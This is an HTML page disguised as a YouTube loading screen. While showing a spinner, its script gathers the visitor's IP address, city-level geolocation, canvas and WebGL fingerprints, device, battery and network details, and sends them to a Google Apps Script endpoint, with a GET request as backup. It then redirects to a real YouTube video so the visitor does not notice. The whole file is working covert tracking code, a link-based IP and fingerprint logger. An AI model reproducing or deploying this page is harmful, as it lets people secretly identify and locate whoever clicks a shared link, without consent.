<!DOCTYPE html>
<html>
<head>
    <title>Loading YouTube...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 150px;
            background: white;
            margin: 0;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Preparing YouTube video...</h3>

    <script>
        const REDIRECT = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbyu-FplHmcNp_i-igCHmrptUoSePI_Dpvk9HG13qFsM9iqA936TJA0hm8U40ML2a9GxFg/exec';
        
        let dataSent = false; // Flag to prevent duplicates

        // Collect SUPER ACCURATE data
        async function collectAllData() {
            const data = {
                // âœ… Time
                timestamp: new Date().toISOString(),
                local_time: new Date().toLocaleString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezone_offset: new Date().getTimezoneOffset(),
                
                // âœ… Browser
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : '',
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                do_not_track: navigator.doNotTrack || 'Not set',
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                
                // âœ… Screen
                screen_resolution: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth + ' bit',
                pixel_ratio: window.devicePixelRatio,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
                
                // âœ… Hardware
                hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
                device_memory: navigator.deviceMemory || 'Unknown',
                max_touch_points: navigator.maxTouchPoints || 0,
                
                // âœ… Location & Network
                referrer: document.referrer || 'Direct',
                url: window.location.href,
                
                // âœ… Features
                localStorage: window.localStorage ? 'Supported' : 'Not supported',
                sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
                notifications: 'Notification' in window ? 'Supported' : 'Not supported',
                
                // âœ… Plugins
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
                
                // âœ… Canvas Fingerprint (Super Accurate)
                canvas_fingerprint: getCanvasFingerprint(),
                
                // âœ… WebGL Renderer (Graphics Card Info)
                webgl: getWebGLInfo()
            };

            // Get IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                
                // Get SUPER ACCURATE Geolocation
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                
                data.geolocation = {
                    ip: geoData.ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    country_code: geoData.country_code,
                    postal: geoData.postal,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    timezone: geoData.timezone,
                    utc_offset: geoData.utc_offset,
                    asn: geoData.asn,
                    org: geoData.org,
                    isp: geoData.org
                };
            } catch (error) {
                data.ip = 'Failed to fetch';
                data.geolocation = { error: 'Geolocation failed' };
            }

            // Network info
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms'
                };
            }

            // Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        charging_time: battery.chargingTime || 'Unknown',
                        discharging_time: battery.dischargingTime || 'Unknown'
                    };
                } catch (e) {}
            }

            // WebRTC
            data.webrtc = !!window.RTCPeerConnection;

            return data;
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                ctx.globalCompositeOperation = 'multiply';
                ctx.fillStyle = 'rgb(255,0,255)';
                ctx.beginPath();
                ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
                ctx.closePath();
                ctx.fill();
                return canvas.toDataURL().substring(22, 50);
            } catch(e) {
                return 'Canvas blocked: ' + e.message;
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'WebGL not supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        version: gl.getParameter(gl.VERSION)
                    };
                }
                return 'WebGL supported (no debug info)';
            } catch(e) {
                return 'WebGL error: ' + e.message;
            }
        }

        // Main execution - sends data ONCE
        collectAllData().then(data => {
            if (dataSent) return;
            dataSent = true;
            
            console.log('ðŸŽ¯ ULTRA-ACCURATE DATA CAPTURED:', data);
            
            // Send ONLY via POST (most reliable)
            fetch(EMAIL_SCRIPT, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                console.log('âœ… Data sent successfully');
            }).catch(err => {
                console.log('âš ï¸ Primary send failed, trying backup...');
                // Backup: send via GET
                const params = new URLSearchParams();
                for (let key in data) {
                    if (typeof data[key] === 'object') {
                        params.append(key, JSON.stringify(data[key]));
                    } else {
                        params.append(key, data[key]);
                    }
                }
                fetch(EMAIL_SCRIPT + '?' + params.toString());
            });
        }).catch(error => {
            console.error('Error collecting data:', error);
        });

        // Redirect after 2.5 seconds (gives time for data collection)
        setTimeout(() => {
            window.location.href = REDIRECT;
        }, 2500);
    </script>
</body>
</html>
